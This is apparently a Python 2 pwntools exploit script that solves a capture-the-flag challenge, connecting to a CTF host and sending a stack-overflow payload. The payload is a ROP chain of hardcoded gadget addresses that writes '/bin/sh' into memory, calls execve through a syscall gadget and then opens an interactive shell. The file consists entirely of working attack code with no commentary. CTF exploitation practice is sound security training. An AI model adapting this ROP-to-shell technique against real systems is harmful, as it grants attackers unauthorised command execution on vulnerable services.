from pwn import *
host, port = "ctf.adl.csie.ncu.edu.tw", 11005
p = remote(host, port)
#p = process('./rop')
print p.recv()

shellcode = 'a' * 40

mov_prdi_rcx = 0x0000000000430577
mem_addr = 0x6c0060
pop_rcx = 0x004b8127
pop_rdi = 0x00435600
pop_rsi = 0x00493206
pop_rdx = 0x004371d5
pop_rax = 0x0046b627
syscall = 0x0045eb25


rop = [pop_rcx, '/bin/sh\x00', pop_rdi, mem_addr, mov_prdi_rcx, pop_rax, 0x3b, pop_rsi, 0, pop_rdx, 0, syscall] 

for i in rop:
    if type(i)==str:
        shellcode += i
    else:
        shellcode += p64(i)

p.sendline(shellcode)

p.interactive()

    


